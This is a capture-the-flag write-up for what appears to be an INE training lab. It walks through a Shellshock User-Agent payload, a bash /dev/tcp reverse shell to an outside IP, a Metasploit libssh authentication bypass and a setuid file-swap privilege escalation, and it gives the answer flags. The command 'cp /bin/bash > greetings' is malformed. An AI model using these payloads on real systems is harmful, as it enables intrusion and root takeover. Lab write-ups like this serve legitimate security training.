
---

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Flags to Capture:**

- **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- Burp Suite
- Metasploit Framework


---

### First Target:

We will start with our Nmap scan: `nmap -Pn -A -p- -v target1.ine.local`

This will reveal that this target is running a website on port 80 using http.

After visiting this website, we notice that the name of the main page of it is: "browser.cgi" . That means this website might be vulnerable to Shellshock vulnerability. To make sure it is indeed vulnerable, we will use this Nmap script like so: `nmap -Pn --script=http-shellshock.nse --script-args "http-shellshock.uri=/browser.cgi" -A -p80 -v target1.ine.local`  

The website is indeed vulnerable.

Now, we will open BurpSuite to capture the main page traffic and send it to Repeater. 

In the User-Agent, we will replace the text with this:" () { : ; };  echo; echo; /bin/bash -c 'ls -la' "

This will show us a list of files in the system, further confirming that we found a Shellshock vulnerability. Now, we can get a reverse shell on the target. 

We will run Netcat to listen on port 1234 like so: `nc -nvlp 1234`

We will replace the malicious code that we have put previously to list the files with this: " bash -i >&/dev/tcp/192.46.214.2/1234 0>&1 " Putting our IP address and the port number that Netcat is currently listening to. If we sent this request and returned back to Netcat, we will find that we have a reverse shell on the target system.

The first flag will be found in "/" directory and the second flag will be in "/opt/apache/htdocs" in a file called ."flag.txt"

**First flag:** d6312240e30447b7a09809193980e653

**Second flag:** f0a9f6ced2644d7d80bcc9e233b9e58b

---

### Second target

We will start with our Nmap scan: `nmap -Pn -A -p- -v target2.ine.local

This will reveal that SSH is running on the target. Specifically, libssh 0.8.3 version 

We can search MSF for an exploit in this version of SSH: `search libssh`

We will find this module: "auxiliary/scanner/ssh/libssh_auth_bypass"

After showing its info, we get this:"This module exploits an authentication bypass in libssh server code where a USERAUTH_SUCCESS message is sent in place of the expected USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and 0.8.0 through 0.8.3 are vulnerable."

That means that the version running on the target is vulnerable.

We have two ways to get a reverse shell using this module, the first one is to set its action to Shell, this will automatically create a reverse shell session for us. The second way is to set its action to Execute, this will allow us to execute malicious commands. We can use the same bash script that we used in the first target to get a reverse shell. 

**Note: To use the Shell action, we need also to set spawn_pty to true.**

The third flag will be under "/home/user".

In "/home/user" directory, we will find two files: "greetings" and "welcome". "welcome" file is with setuid permission. That means it can be run with root privileges with any user. We will check if this file is calling upon any other files or not:`strings welcome` . We will discover that "welcome" is calling upon the file "greetings". We can delete the file greetings and replace it with /bin/bash, so when we run "welcome", we will get a shell with root privileges.

First, we delete "greetings":`rm greetings`

Second, we replace it with /bin/bash: ` cp /bin/bash > greetings`

Lastly, we will execute "welcome" :`./welcome`

Now, we are root.

The forth flag will be found in: "/root"

**Third flag:** 3706ee23ed33437eb9b808a4f2b2b7c6

**Forth flag:** 189f3075876044f68e13b11b7ed0e989

